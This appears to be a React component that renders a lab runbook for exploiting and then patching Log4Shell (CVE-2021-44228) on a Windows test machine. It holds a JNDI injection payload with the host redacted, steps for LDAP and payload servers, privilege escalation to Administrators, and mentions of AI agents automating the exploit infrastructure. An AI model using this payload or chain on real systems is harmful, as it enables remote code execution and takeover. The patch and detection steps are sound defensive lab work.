// RunbookDrawer: right-hand drawer with structured runbook content from
// LOG4SHELL_INSTRUCTIONS.md. All sensitive strings sanitized via sanitize().
// Slides in from right when open.

import { sanitize } from '../lib/sanitize';

interface RunbookDrawerProps {
  open: boolean;
  onClose: () => void;
}

interface RunbookSection {
  id: string;
  heading: string;
  steps: string[];
}

// Sanitized runbook sections derived from LOG4SHELL_INSTRUCTIONS.md
// All real IPs, credentials, and raw exploit commands are replaced.
const SECTIONS: RunbookSection[] = [
  {
    id: 'overview',
    heading: 'OVERVIEW',
    steps: [
      'Target: Windows 11 system running VulnerableApp (Java 8 + Log4j 2.14.0) as LocalSystem service.',
      'Scope: CVE-2021-44228 Log4Shell — JNDI injection via HTTP User-Agent header.',
      'Goal: Demonstrate privilege escalation from low-privilege user to LocalSystem.',
      'CISA KEV rank #4 · CVSS 10.0 · EPSS 0.97 (99.9th percentile).',
    ],
  },
  {
    id: 'step1',
    heading: 'STEP 1 — COPY SETUP SCRIPT',
    steps: [
      'Copy log4shell_setup.py to the lab machine via SCP.',
      'Target machine: [LAB-HOST] · connect via SSH as [OPERATOR] (admin account).',
      'Destination: C:\\Users\\[OPERATOR]\\Desktop\\log4shell_setup.py',
    ],
  },
  {
    id: 'step2',
    heading: 'STEP 2 — RUN SETUP AS ADMINISTRATOR',
    steps: [
      'Open PowerShell as Administrator on the target machine.',
      'Execute: python log4shell_setup.py',
      'The script will: add Defender exclusions, download Java 8, download Log4j 2.14.0, build VulnerableApp, install as Windows service (LocalSystem).',
    ],
  },
  {
    id: 'step3',
    heading: 'STEP 3 — VERIFY SETUP',
    steps: [
      'Run check_setup.py on the target to verify the environment.',
      'Confirm: VulnerableApp service RUNNING, port 8080 LISTENING.',
      'Test basic connectivity: GET http://[LAB-HOST]:8080/ → should return "Request logged successfully".',
    ],
  },
  {
    id: 'step4',
    heading: 'STEP 4 — SHOW PRE-EXPLOIT PRIVILEGES',
    steps: [
      'SSH as low-privilege account [GUEST].',
      'Run: whoami → should show [GUEST] (low-privilege).',
      'Run: whoami /priv → confirm limited privileges, no SeDebugPrivilege.',
      'Run: net localgroup administrators → [GUEST] should NOT be listed.',
    ],
  },
  {
    id: 'step5',
    heading: 'STEP 5 — SET UP EXPLOIT INFRASTRUCTURE',
    steps: [
      'Start LDAP redirect server on the operator machine (Marshalsec).',
      'LDAP server redirects class load requests to the HTTP payload server.',
      'Start HTTP server serving the compiled exploit class (port 8888).',
      'Note: In the Prophet demo, the Qwen executor handles this infrastructure automatically.',
    ],
  },
  {
    id: 'step6',
    heading: 'STEP 6 — EXECUTE LOG4SHELL',
    steps: [
      'Send crafted HTTP request to VulnerableApp:',
      '  User-Agent: ${jndi:ldap://[REDACTED]/Exploit}',
      'Log4j 2.14.0 processes the JNDI lookup without sanitization.',
      'LDAP referral fires → remote class loaded → static initializer runs as LocalSystem.',
      'The Prophet agent validates exploitability via controlled OOB callback (no class execution during validation).',
    ],
  },
  {
    id: 'step7',
    heading: 'STEP 7 — VERIFY PRIVILEGE ESCALATION',
    steps: [
      'Check exploit evidence file: C:\\lab\\exploit_proof.txt (created as SYSTEM).',
      'Confirm privilege escalation: [GUEST] added to Administrators group.',
      'In Prophet demo: this phase generates the controlled-callback indicator only.',
    ],
  },
  {
    id: 'step8',
    heading: 'STEP 8 — APPLY PATCH (PHASE IV)',
    steps: [
      'Primary: set JVM flag -Dlog4j2.formatMsgNoLookups=true (disables JNDI lookups globally).',
      'Secondary: update log4j2.xml PatternLayout to %msg{nolookups}.',
      'Fallback: remove org/apache/logging/log4j/core/lookup/JndiLookup.class from log4j-core JAR.',
      'Restart VulnerableApp service after applying patch.',
    ],
  },
  {
    id: 'step9',
    heading: 'STEP 9 — VERIFY PATCH',
    steps: [
      'Re-run Nuclei template against patched target.',
      'Expected result: NOT VULNERABLE · no JNDI callback received.',
      'Deploy generated Sigma rule to SIEM for ongoing detection.',
    ],
  },
  {
    id: 'cleanup',
    heading: 'CLEANUP',
    steps: [
      'Stop and remove VulnerableApp service: net stop VulnerableApp && sc delete VulnerableApp',
      'Remove lab directory: Remove-Item -Recurse -Force C:\\lab',
      'Remove Defender exclusions: Remove-MpPreference -ExclusionPath "C:\\lab"',
      'Remove [GUEST] from administrators group: net localgroup administrators [GUEST] /delete',
    ],
  },
];

const D = '$';

export function RunbookDrawer({ open, onClose }: RunbookDrawerProps) {
  return (
    <>
      {/* Backdrop */}
      {open && (
        <div
          className="runbook-backdrop"
          onClick={onClose}
          aria-hidden="true"
        />
      )}

      {/* Drawer */}
      <aside
        className={`runbook-drawer${open ? ' runbook-drawer--open' : ''}`}
        aria-label="Lab runbook"
        aria-hidden={!open}
      >
        <div className="runbook-header">
          <div className="runbook-eyebrow">LOG4SHELL RUNBOOK</div>
          <button
            className="runbook-close"
            onClick={onClose}
            aria-label="Close runbook"
          >
            [ CLOSE ]
          </button>
        </div>

        <div className="runbook-subheader">
          <span className="runbook-cve">CVE-2021-44228</span>
          <span className="runbook-sep">·</span>
          <span>Apache Log4j 2 · JNDI Injection / RCE</span>
          <span className="runbook-sep">·</span>
          <span>CVSS 10.0</span>
        </div>

        <div className="runbook-body">
          {SECTIONS.map((section, sIdx) => (
            <div key={section.id} className="runbook-section">
              <div className="runbook-section-heading">
                <span className="runbook-section-num">{String(sIdx + 1).padStart(2, '0')}</span>
                <span>{section.heading}</span>
              </div>
              <ol className="runbook-steps">
                {section.steps.map((step, i) => (
                  <li key={i} className="runbook-step">
                    <span className="runbook-step-num">{i + 1}.</span>
                    <span className="runbook-step-text">
                      {sanitize(step.replace('${jndi:ldap://[REDACTED]/Exploit}', `${D}{jndi:ldap://[REDACTED]/Exploit}`))}
                    </span>
                  </li>
                ))}
              </ol>
            </div>
          ))}
        </div>

        <div className="runbook-footer">
          <span>LAB-001</span>
          <span className="runbook-footer-sep">·</span>
          <span>LOG4SHELL</span>
          <span className="runbook-footer-sep">·</span>
          <span>CVE-2021-44228</span>
          <span className="runbook-footer-sep">·</span>
          <span>CLASSIFICATION FOUO</span>
        </div>
      </aside>
    </>
  );
}
